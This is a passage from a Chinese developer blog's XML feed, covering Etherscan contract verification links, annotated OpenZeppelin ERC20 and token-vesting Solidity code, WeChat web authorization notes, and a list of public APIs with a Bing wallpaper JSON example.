<li><p><a href="https://etherscancom.freshdesk.com/support/solutions/articles/35000022165-contract-verification-constructor-arguments" target="_blank" rel="noopener">《3份有构造参数的合约验证示例》</a></p>
<blockquote>
<ol start="0">
<li><a href="https://ropsten.etherscan.io/address/0xcd4d737151d14742d9c75e2b9ef838e3b69bd00c#code" target="_blank" rel="noopener">https://ropsten.etherscan.io/address/0xcd4d737151d14742d9c75e2b9ef838e3b69bd00c#code</a></li>
<li><a href="https://etherscan.io/address/0x38c6A68304cdEfb9BEc48BbFaABA5C5B47818bb2#contracts" target="_blank" rel="noopener">https://etherscan.io/address/0x38c6A68304cdEfb9BEc48BbFaABA5C5B47818bb2#contracts</a></li>
<li><a href="https://etherscan.io/address/0x7da82c7ab4771ff031b66538d2fb9b0b047f6cf9#code" target="_blank" rel="noopener">https://etherscan.io/address/0x7da82c7ab4771ff031b66538d2fb9b0b047f6cf9#code</a></li>
<li><a href="https://etherscan.io/address/0x85bc00724203d53536072b000c44a2cc16cd12c5#code" target="_blank" rel="noopener">https://etherscan.io/address/0x85bc00724203d53536072b000c44a2cc16cd12c5#code</a></li>
<li><a href="https://etherscan.io/address/0x63091244180ae240c87d1f528f5f269134cb07b3#code" target="_blank" rel="noopener">https://etherscan.io/address/0x63091244180ae240c87d1f528f5f269134cb07b3#code</a></li>
</ol>
</blockquote>
</li>
<li><p><a href="https://etherscan.io/sourcecode-demo.html" target="_blank" rel="noopener">《Demo HTTP Post for using the Source Code Verfication Submission API》</a></p>
<blockquote>
<p>Contracts that use “imports” will need to have the ode concatenated into one file as we do not support “imports” in separate files. You can try using the Blockcat solidity-flattener or SolidityFlattery<br>合约中使用了“imports”的，需要代码连接到一个文件中，因为我们不支持在单独的文件中使用“imports”。你可以尝试使用 <code>Blockcat solidity-flattener</code> 或 <code>SolidityFlattery</code></p>
</blockquote>
</li>
<li><p><a href="https://blog.csdn.net/liudaoqiang_tj/article/details/81160513" target="_blank" rel="noopener">Ropsten部署合约-2</a></p>
<blockquote>
<p>这个作者的情况和我遇到的很相似。</p>
</blockquote>
</li>
<li><p><a href="https://www.yidaibi.me/blog/how-to-verify-ethereum-smart-contracts-source-code.html" target="_blank" rel="noopener">如何验证Ethereum smart contract的源代码</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>9、OpenZeppelin ERC20源码注释</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE/9%E3%80%81OpenZeppelin%20ERC20%E6%BA%90%E7%A0%81%E6%B3%A8%E9%87%8A/</url>
    <content><![CDATA[<p>ERC20：Ethereum Request for Comments 20，是一个基于以太坊代币的接口标准（协议）。所有符合 ERC-20 标准的代币都能立即兼容以太坊钱包，它能让用户和交易所，都能非常方便的管理多种代币，转账、存储、ICO 等等。</p>
<p>StandardToken.sol<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">import &quot;./BasicToken.sol&quot;;</span><br><span class="line">import &quot;./ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title 标准 ERC20 token</span><br><span class="line"> *</span><br><span class="line"> * @dev 实现基础的标准token</span><br><span class="line"> * @dev https://github.com/ethereum/EIPs/issues/20</span><br><span class="line"> * @dev Based on code by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol</span><br><span class="line"> */</span><br><span class="line">contract StandardToken is ERC20, BasicToken &#123;</span><br><span class="line">  mapping (address =&gt; mapping (address =&gt; uint256)) internal allowed;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">   * @dev 从一个地址向另外一个地址转token</span><br><span class="line">   * @param _from 转账的from地址</span><br><span class="line">   * @param _to address 转账的to地址</span><br><span class="line">   * @param _value uint256 转账token数量</span><br><span class="line">   */</span><br><span class="line">  function transferFrom(</span><br><span class="line">    address _from,</span><br><span class="line">    address _to,</span><br><span class="line">    uint256 _value</span><br><span class="line">  )</span><br><span class="line">    public</span><br><span class="line">    returns (bool)</span><br><span class="line">  &#123;</span><br><span class="line">    // 做合法性检查</span><br><span class="line">    require(_to != address(0));</span><br><span class="line">    require(_value &lt;= balances[_from]);</span><br><span class="line">    require(_value &lt;= allowed[_from][msg.sender]);</span><br><span class="line">    //_from余额减去相应的金额</span><br><span class="line">    //_to余额加上相应的金额</span><br><span class="line">    //msg.sender可以从账户_from中转出的数量减少_value</span><br><span class="line">    balances[_from] = balances[_from].sub(_value);</span><br><span class="line">    balances[_to] = balances[_to].add(_value);</span><br><span class="line">    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);</span><br><span class="line">    // 触发Transfer事件</span><br><span class="line">    emit Transfer(_from, _to, _value);</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">   * @dev 批准传递的address以代表msg.sender花费指定数量的token</span><br><span class="line">   *</span><br><span class="line">   * Beware that changing an allowance with this method brings the risk that someone may use both the old</span><br><span class="line">   * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this</span><br><span class="line">   * race condition is to first reduce the spender&apos;s allowance to 0 and set the desired value afterwards:</span><br><span class="line">   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729</span><br><span class="line">   * @param _spender 花费资金的地址</span><br><span class="line">   * @param _value 可以被花费的token数量</span><br><span class="line">   */</span><br><span class="line">  function approve(address _spender, uint256 _value) public returns (bool) &#123;</span><br><span class="line">    //记录msg.sender允许_spender动用的token</span><br><span class="line">    allowed[msg.sender][_spender] = _value;</span><br><span class="line">    //触发Approval事件</span><br><span class="line">    emit Approval(msg.sender, _spender, _value);</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">   * @dev 函数检查所有者允许的_spender花费的token数量</span><br><span class="line">   * @param _owner address 资金所有者地址.</span><br><span class="line">   * @param _spender address 花费资金的spender的地址.</span><br><span class="line">   * @return A uint256 指定_spender仍可用token的数量。</span><br><span class="line">   */</span><br><span class="line">  function allowance(</span><br><span class="line">    address _owner,</span><br><span class="line">    address _spender</span><br><span class="line">   )</span><br><span class="line">    public</span><br><span class="line">    view</span><br><span class="line">    returns (uint256)</span><br><span class="line">  &#123;</span><br><span class="line">    //允许_spender从_owner中转出的token数</span><br><span class="line">    return allowed[_owner][_spender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">   * @dev 增加所有者允许_spender花费代币的数量。</span><br><span class="line">   *</span><br><span class="line">   * allowed[_spender] == 0时approve应该被调用. 增加allowed值最好使用此函数避免2此调用（等待知道第一笔交易被挖出）</span><br><span class="line">   * From MonolithDAO Token.sol</span><br><span class="line">   * @param _spender 花费资金的地址</span><br><span class="line">   * @param _addedValue 用于增加允许动用的token牌数量</span><br><span class="line">   */</span><br><span class="line">  function increaseApproval(</span><br><span class="line">    address _spender,</span><br><span class="line">    uint _addedValue</span><br><span class="line">  )</span><br><span class="line">    public</span><br><span class="line">    returns (bool)</span><br><span class="line">  &#123;</span><br><span class="line">    //在之前允许的数量上增加_addedValue</span><br><span class="line">    allowed[msg.sender][_spender] = (</span><br><span class="line">      allowed[msg.sender][_spender].add(_addedValue));</span><br><span class="line">    //触发Approval事件</span><br><span class="line">    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">   * @dev 减少所有者允许_spender花费代币的数量</span><br><span class="line">   *</span><br><span class="line">   * allowed[_spender] == 0时approve应该被调用. 减少allowed值最好使用此函数避免2此调用（等待知道第一笔交易被挖出）</span><br><span class="line">   * From MonolithDAO Token.sol</span><br><span class="line">   * @param _spender  花费资金的地址</span><br><span class="line">   * @param _subtractedValue 用于减少允许动用的token牌数量</span><br><span class="line">   */</span><br><span class="line">  function decreaseApproval(</span><br><span class="line">    address _spender,</span><br><span class="line">    uint _subtractedValue</span><br><span class="line">  )</span><br><span class="line">    public</span><br><span class="line">    returns (bool)</span><br><span class="line">  &#123;</span><br><span class="line">    uint oldValue = allowed[msg.sender][_spender];</span><br><span class="line">    if (_subtractedValue &gt; oldValue) &#123;</span><br><span class="line">    //减少的数量少于之前允许的数量，则清零</span><br><span class="line">      allowed[msg.sender][_spender] = 0;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    //减少对应的_subtractedValue数量</span><br><span class="line">      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);</span><br><span class="line">    &#125;</span><br><span class="line">    //触发Approval事件</span><br><span class="line">    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>BasicToken.sol<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">import &quot;./ERC20Basic.sol&quot;;</span><br><span class="line">import &quot;../../math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title 实现ERC20基本合约的接口</span><br><span class="line"> * @dev 基本的StandardToken，不包含allowances.</span><br><span class="line"> */</span><br><span class="line">contract BasicToken is ERC20Basic &#123;</span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint256) balances;</span><br><span class="line"></span><br><span class="line">  uint256 totalSupply_;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">  * @dev 返回存在的token总数</span><br><span class="line">  */</span><br><span class="line">  function totalSupply() public view returns (uint256) &#123;</span><br><span class="line">    return totalSupply_;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">  * @dev 给特定的address转token</span><br><span class="line">  * @param _to 要转账到的address</span><br><span class="line">  * @param _value 要转账的金额</span><br><span class="line">  */</span><br><span class="line">  function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class="line">    //做相关的合法验证</span><br><span class="line">    require(_to != address(0));</span><br><span class="line">    require(_value &lt;= balances[msg.sender]);</span><br><span class="line">    // msg.sender余额中减去额度，_to余额加上相应额度</span><br><span class="line">    balances[msg.sender] = balances[msg.sender].sub(_value);</span><br><span class="line">    balances[_to] = balances[_to].add(_value);</span><br><span class="line">    //触发Transfer事件</span><br><span class="line">    emit Transfer(msg.sender, _to, _value);</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">  * @dev 获取指定address的余额</span><br><span class="line">  * @param _owner 查询余额的address.</span><br><span class="line">  * @return An uint256 representing the amount owned by the passed address.</span><br><span class="line">  */</span><br><span class="line">  function balanceOf(address _owner) public view returns (uint256) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>SafeERC20.sol (一个 ERC20 的安全操作库)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">import &quot;./ERC20Basic.sol&quot;;</span><br><span class="line">import &quot;./ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title SafeERC20</span><br><span class="line"> * @dev 围绕ERC20操作发生故障的包装程序.</span><br><span class="line"> * 可以在合约中通过这样使用这个库 `using SafeERC20 for ERC20;` 来使用安全的操作`token.safeTransfer(...)`</span><br><span class="line"> */</span><br><span class="line">library SafeERC20 &#123;</span><br><span class="line">  function safeTransfer(ERC20Basic token, address to, uint256 value) internal &#123;</span><br><span class="line">    require(token.transfer(to, value));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function safeTransferFrom(</span><br><span class="line">    ERC20 token,</span><br><span class="line">    address from,</span><br><span class="line">    address to,</span><br><span class="line">    uint256 value</span><br><span class="line">  )</span><br><span class="line">    internal</span><br><span class="line">  &#123;</span><br><span class="line">    require(token.transferFrom(from, to, value));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function safeApprove(ERC20 token, address spender, uint256 value) internal &#123;</span><br><span class="line">    require(token.approve(spender, value));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>时间锁仓<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">import &quot;zeppelin-solidity/contracts/token/ERC20/SafeERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title TokenTimelock</span><br><span class="line"> * @dev TokenTimelock is a token holder contract that will allow a</span><br><span class="line"> * beneficiary to extract the tokens after a given release time</span><br><span class="line"> */</span><br><span class="line">contract TokenTimelock &#123;</span><br><span class="line">  using SafeERC20 for ERC20Basic;</span><br><span class="line"></span><br><span class="line">  // 代币种类（合约地址）</span><br><span class="line">  ERC20Basic public token;</span><br><span class="line"></span><br><span class="line">  // 释放后的受益人address</span><br><span class="line">  address public beneficiary;</span><br><span class="line"></span><br><span class="line">  // token可以被释放的时间戳(秒)</span><br><span class="line">  uint256 public releaseTime;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">   * 创建合约，定义Token，收益者，固定时间释放</span><br><span class="line">   * （Token要手动转入创建的合约地址）</span><br><span class="line">   *</span><br><span class="line">   * ERC20Basic _token : 锁仓的ERC20合约地址</span><br><span class="line">   * address _beneficiary: 受益者的合约地址</span><br><span class="line">   * uint256 _releaseTime: 锁仓时间（单位秒）</span><br><span class="line">   */</span><br><span class="line">  constructor(</span><br><span class="line">    ERC20Basic _token,</span><br><span class="line">    address _beneficiary,</span><br><span class="line">    uint256 _releaseTime</span><br><span class="line">  )</span><br><span class="line">    public</span><br><span class="line">  &#123;</span><br><span class="line">    // solium-disable-next-line security/no-block-members</span><br><span class="line">    require(_releaseTime &gt; block.timestamp);</span><br><span class="line">    token = _token;</span><br><span class="line">    beneficiary = _beneficiary;</span><br><span class="line">    releaseTime = _releaseTime;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">   * 将时间限制内的token转移给收益人.（合约中的余额 -&gt;合约中的收益人）</span><br><span class="line">   */</span><br><span class="line">  function release() public &#123;</span><br><span class="line">    // solium-disable-next-line security/no-block-members</span><br><span class="line">    require(block.timestamp &gt;= releaseTime);</span><br><span class="line"></span><br><span class="line">    uint256 amount = token.balanceOf(address(this));</span><br><span class="line">    require(amount &gt; 0);</span><br><span class="line"></span><br><span class="line">    token.safeTransfer(beneficiary, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>断崖式持续锁仓<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import &quot;zeppelin-solidity/contracts/token/ERC20/ERC20Basic.sol&quot;;</span><br><span class="line">import &quot;zeppelin-solidity/contracts/token/ERC20/SafeERC20.sol&quot;;</span><br><span class="line">import &quot;zeppelin-solidity/contracts/ownership/Ownable.sol&quot;;</span><br><span class="line">import &quot;zeppelin-solidity/contracts/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract TokenLockVesting is Ownable&#123;</span><br><span class="line"></span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    using SafeERC20 for ERC20Basic;</span><br><span class="line"></span><br><span class="line">    event Released(uint256 amount);</span><br><span class="line">    event Revoked();</span><br><span class="line"></span><br><span class="line">    // beneficiary of tokens after they are released</span><br><span class="line">    address public beneficiary;</span><br><span class="line"></span><br><span class="line">    uint256 public cliff;</span><br><span class="line">    uint256 public cliffTs;</span><br><span class="line">    uint256 public start;</span><br><span class="line">    uint256 public duration;</span><br><span class="line"></span><br><span class="line">    bool public revocable;</span><br><span class="line"></span><br><span class="line">    mapping (address =&gt; uint256) public released;</span><br><span class="line">    mapping (address =&gt; bool) public revoked;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Creates a vesting contract that vests its balance of any ERC20 token to the</span><br><span class="line">     * _beneficiary, gradually in a linear fashion until _start + _duration. By then all</span><br><span class="line">     * of the balance will have vested.</span><br><span class="line">     * @param _beneficiary address of the beneficiary to whom vested tokens are transferred</span><br><span class="line">     * @param _cliff duration in seconds of the cliff in which tokens will begin to vest</span><br><span class="line">     * @param _start the time (as Unix time) at which point vesting starts</span><br><span class="line">     * @param _duration duration in seconds of the period in which the tokens will vest</span><br><span class="line">     * @param _revocable whether the vesting is revocable or not</span><br><span class="line">     */</span><br><span class="line">    constructor(</span><br><span class="line">        address _beneficiary,</span><br><span class="line">        uint256 _start,</span><br><span class="line">        uint256 _cliff,</span><br><span class="line">        uint256 _duration,</span><br><span class="line">        bool _revocable</span><br><span class="line">    )</span><br><span class="line">    public</span><br><span class="line">    &#123;</span><br><span class="line">        require(_beneficiary != address(0));</span><br><span class="line">        require(_cliff &lt;= _duration);</span><br><span class="line"></span><br><span class="line">        beneficiary = _beneficiary;</span><br><span class="line">        revocable = _revocable;</span><br><span class="line">        duration = _duration;//duration是一个x秒时间段</span><br><span class="line">        start = _start;</span><br><span class="line">        cliff = _cliff;</span><br><span class="line">        cliffTs = _start.add(_cliff);//_cliff是x秒时间段，cliffTs是一个时间戳</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * @notice Transfers vested tokens to beneficiary.</span><br><span class="line">     * @param _token ERC20 token which is being vested</span><br><span class="line">     */</span><br><span class="line">    function release(ERC20Basic _token) public &#123;</span><br><span class="line">        uint256 unreleased = releasableAmount(_token);</span><br><span class="line"></span><br><span class="line">        require(unreleased &gt; 0);</span><br><span class="line"></span><br><span class="line">        released[_token] = released[_token].add(unreleased);</span><br><span class="line"></span><br><span class="line">        _token.safeTransfer(beneficiary, unreleased);</span><br><span class="line"></span><br><span class="line">        emit Released(unreleased);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @notice Allows the owner to revoke the vesting. Tokens already vested</span><br><span class="line">     * remain in the contract, the rest are returned to the owner.</span><br><span class="line">     * @param _token ERC20 token which is being vested</span><br><span class="line">     */</span><br><span class="line">    function revoke(ERC20Basic _token) public onlyOwner &#123;</span><br><span class="line">        require(revocable);</span><br><span class="line">        require(!revoked[_token]);</span><br><span class="line"></span><br><span class="line">        uint256 balance = _token.balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">        uint256 unreleased = releasableAmount(_token);</span><br><span class="line">        uint256 refund = balance.sub(unreleased);</span><br><span class="line"></span><br><span class="line">        revoked[_token] = true;</span><br><span class="line"></span><br><span class="line">        _token.safeTransfer(owner, refund);</span><br><span class="line"></span><br><span class="line">        emit Revoked();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev 计算已授予但尚未释放的金额。</span><br><span class="line">     * @dev Calculates the amount that has already vested but hasn&apos;t been released yet.</span><br><span class="line">     * @param _token ERC20 token which is being vested</span><br><span class="line">     */</span><br><span class="line">    function releasableAmount(ERC20Basic _token) public view returns (uint256) &#123;</span><br><span class="line">        return vestedAmount(_token).sub(released[_token]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev 计算已授予的金额。</span><br><span class="line">     * @dev Calculates the amount that has already vested.</span><br><span class="line">     * @param _token ERC20 token which is being vested</span><br><span class="line">     */</span><br><span class="line">    function vestedAmount(ERC20Basic _token) public view returns (uint256) &#123;</span><br><span class="line">        uint256 currentBalance = _token.balanceOf(address(this));</span><br><span class="line">        uint256 totalBalance = currentBalance.add(released[_token]);</span><br><span class="line"></span><br><span class="line">        // block.timestamp 块校验unix时间戳</span><br><span class="line">        if (block.timestamp &lt; cliffTs) &#123;</span><br><span class="line">            //没到释放的时间，所以返回0</span><br><span class="line">            return 0;</span><br><span class="line">        &#125; else if (block.timestamp &gt;= start.add(duration) || revoked[_token]) &#123;</span><br><span class="line">            //块时间已经超过了start + duration，所有的代币都可以释放</span><br><span class="line">            return totalBalance;</span><br><span class="line">        &#125; else&#123;</span><br><span class="line">            //持续释放时间之内</span><br><span class="line">            //mul: X * y</span><br><span class="line">            //div：x / y</span><br><span class="line">            // totalBalance * (block.timestamp - start) / duration</span><br><span class="line">            //return totalBalance.mul(block.timestamp.sub(start)).div(duration);</span><br><span class="line"></span><br><span class="line">            //改造</span><br><span class="line">            return totalBalance.mul(block.timestamp.sub(start).sub(cliff)).div(duration.sub(cliff));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><a href="https://yuanxuxu.com/2018/06/27/openzeppelin-erc20-code-analysis/" target="_blank" rel="noopener">了解更多</a></p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>微信公众平台开发注意事项</title>
    <url>/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%B9%B3%E5%8F%B0%E6%8E%A5%E5%8F%A3/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%B9%B3%E5%8F%B0%E5%BC%80%E5%8F%91%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</url>
    <content><![CDATA[<h2 id="测试号"><a href="#测试号" class="headerlink" title="测试号"></a>测试号</h2><p><img src="/images/weixin/测试账号管理.png" alt="测试账号管理.png"></p>
<p><code>JS接口安全域名</code> 加入你的域名，这样你的域名下网页才能调用 <code>jssdk</code> 。</p>
<h2 id="网页授权"><a href="#网页授权" class="headerlink" title="网页授权"></a>网页授权</h2><p><a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421140842" target="_blank" rel="noopener">微信的网页授权</a>有两个步骤：</p>
<ol>
<li>获取code</li>
<li>通过code获取openId</li>
</ol>
<p>第一步骤有一个坑：网页授权还要配置域名，如下图</p>
<p><img src="/images/weixin/微信接口列表.png" alt="微信接口列表.png"></p>
<p>点击“修改”弹出以下弹框，输入你的域名，才能成功授权，否则一直提示 <code>redirect_uri参数错误</code> 。<br><img src="/images/weixin/微信网页授权.png" alt="微信网页授权.png"></p>
<p>授权成功之后，获取到 <code>code</code> 参数，post到后台，由后台来向微信服务器请求获取 <code>openId</code> 。</p>
<h2 id="签名域名"><a href="#签名域名" class="headerlink" title="签名域名"></a>签名域名</h2><p>在调用jssdk之前，要对当前的域名权限验证配置。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wx.config(&#123;</span><br><span class="line">    debug: true, // 开启调试模式,调用的所有api的返回值会在客户端alert出来，若要查看传入的参数，可以在pc端打开，参数信息会通过log打出，仅在pc端时才会打印。</span><br><span class="line">    appId: &apos;&apos;, // 必填，公众号的唯一标识</span><br><span class="line">    timestamp: , // 必填，生成签名的时间戳</span><br><span class="line">    nonceStr: &apos;&apos;, // 必填，生成签名的随机串</span><br><span class="line">    signature: &apos;&apos;,// 必填，签名</span><br><span class="line">    jsApiList: [] // 必填，需要使用的JS接口列表</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p><code>signature</code> 由 <code>jsapi_ticket</code> 、<code>noncestr</code> 、<code>timestamp</code> 和 <code>url</code> 生成，<code>url</code>中的域名必须是已经加入到 <code>JS接口安全域名</code> 中。</p>
<p>一般有前端提交 <code>url</code> 参数给后台，后台生成所有参数响应给前端，前端进行签名配置。</p>
]]></content>
      <categories>
        <category>微信公众平台</category>
      </categories>
      <tags>
        <tag>微信公众平台</tag>
      </tags>
  </entry>
  <entry>
    <title>常用API</title>
    <url>/%E5%BC%80%E6%94%BEAPI/%E5%B8%B8%E7%94%A8API/</url>
    <content><![CDATA[<h4 id="有道词典：API-链接"><a href="#有道词典：API-链接" class="headerlink" title="有道词典：API 链接"></a><a href="https://github.com/jokermonn/-Api/blob/master/YoudaoDic.md" target="_blank" rel="noopener">有道词典：API 链接</a></h4><h4 id="微软必应词典：API-链接"><a href="#微软必应词典：API-链接" class="headerlink" title="微软必应词典：API 链接"></a><a href="https://github.com/jokermonn/-Api/blob/master/BingDic.md" target="_blank" rel="noopener">微软必应词典：API 链接</a></h4><h4 id="中央天气预报：API-链接"><a href="#中央天气预报：API-链接" class="headerlink" title="中央天气预报：API 链接"></a><a href="https://github.com/jokermonn/-Api/blob/master/CenterWeather.md" target="_blank" rel="noopener">中央天气预报：API 链接</a></h4><h4 id="小米天气：API-链接"><a href="#小米天气：API-链接" class="headerlink" title="小米天气：API 链接"></a><a href="https://github.com/jokermonn/-Api/blob/master/XiaomiWeather.md" target="_blank" rel="noopener">小米天气：API 链接</a></h4><h4 id="OPPO-天气：API-链接"><a href="#OPPO-天气：API-链接" class="headerlink" title="OPPO 天气：API 链接"></a><a href="https://github.com/jokermonn/-Api/blob/master/OPPOWeather.md" target="_blank" rel="noopener">OPPO 天气：API 链接</a></h4><h4 id="每日一文：API-链接"><a href="#每日一文：API-链接" class="headerlink" title="每日一文：API 链接"></a><a href="https://github.com/jokermonn/-Api/blob/master/OneArticle.md" target="_blank" rel="noopener">每日一文：API 链接</a></h4><h4 id="ONE-v3-5-0-之后版本：API-链接"><a href="#ONE-v3-5-0-之后版本：API-链接" class="headerlink" title="ONE v3.5.0 之后版本：API 链接"></a><a href="https://github.com/jokermonn/-Api/blob/master/ONEv3.5.0~.md" target="_blank" rel="noopener">ONE v3.5.0 之后版本：API 链接</a></h4><h4 id="快递100：API-链接"><a href="#快递100：API-链接" class="headerlink" title="快递100：API 链接"></a><a href="https://github.com/jokermonn/-Api/blob/master/ExpressDelivery100.md" target="_blank" rel="noopener">快递100：API 链接</a></h4><h4 id="必应每日壁纸API"><a href="#必应每日壁纸API" class="headerlink" title="必应每日壁纸API"></a>必应每日壁纸API</h4><p><a href="http://www.bing.com/HPImageArchive.aspx?format=js&amp;n=1&amp;idx=1" target="_blank" rel="noopener">http://www.bing.com/HPImageArchive.aspx?format=js&amp;n=1&amp;idx=1</a></p>
<p>参数n表示图片数目, idx是index的缩写.</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="attr">"images"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"startdate"</span>: <span class="string">"20160712"</span>,</span><br><span class="line">            <span class="attr">"fullstartdate"</span>: <span class="string">"201607121600"</span>,</span><br><span class="line">            <span class="attr">"enddate"</span>: <span class="string">"20160713"</span>,</span><br><span class="line">            <span class="attr">"url"</span>: <span class="string">"http://s.cn.bing.net/az/hprichbg/rb/BangkokNightMarket_ZH-CN11275629598_1920x1080.jpg"</span>,</span><br><span class="line">            <span class="attr">"urlbase"</span>: <span class="string">"/az/hprichbg/rb/BangkokNightMarket_ZH-CN11275629598"</span>,</span><br><span class="line">            <span class="attr">"copyright"</span>: <span class="string">"拉差达的火车夜市，泰国曼谷  (© FUN FUN PHOTO/Shutterstock)"</span>,</span><br><span class="line">            <span class="attr">"copyrightlink"</span>: <span class="string">"http://www.bing.com/search?q=%E6%9B%BC%E8%B0%B7&amp;form=hpcapt&amp;mkt=zh-cn"</span>,</span><br><span class="line">            <span class="attr">"wp"</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">"hsh"</span>: <span class="string">"32cc314580efb6603452aba681f49e97"</span>,</span><br><span class="line">            <span class="attr">"drk"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"top"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"bot"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"hs"</span>: [ ]</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">"tooltips"</span>: &#123;</span><br><span class="line">        <span class="attr">"loading"</span>: <span class="string">"正在加载..."</span>,</span><br><span class="line">        <span class="attr">"previous"</span>: <span class="string">"上一个图像"</span>,</span><br><span class="line">        <span class="attr">"next"</span>: <span class="string">"下一个图像"</span>,</span><br><span class="line">        <span class="attr">"walle"</span>: <span class="string">"此图片不能下载用作壁纸。"</span>,</span><br><span class="line">        <span class="attr">"walls"</span>: <span class="string">"下载今日美图。仅限用作桌面壁纸。"</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意，如果想获取不同分辨率的图片，使用urlbase + 分辨率 就可以了，默认的url是指定一个分辨率的。</p>
<p>如我想把上面的改成480×800：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http://s.cn.bing.net/az/hprichbg/rb/BangkokNightMarket_ZH-CN11275629598_480x800.jpg</span></span><br></pre></td></tr></table></figure>
<p><img src="http://s.cn.bing.net/az/hprichbg/rb/ValleyofYzer_ZH-CN8001552912_720x1280.jpg" alt><br><img src="http://s.cn.bing.net/az/hprichbg/rb/SchonbrunnPalace_ZH-CN11907034371_720x1280.jpg" alt></p>
<h4 id="BING-壁纸-爬虫API"><a href="#BING-壁纸-爬虫API" class="headerlink" title="BING 壁纸 爬虫API "></a><a href="https://github.com/Eary/bing" target="_blank" rel="noopener">BING 壁纸 爬虫API </a></h4><p><code>这是一个博客网站ioliu.cn使用爬虫对bing的抓取,有时候访问有点慢.</code></p>
<ul>
<li><ol>
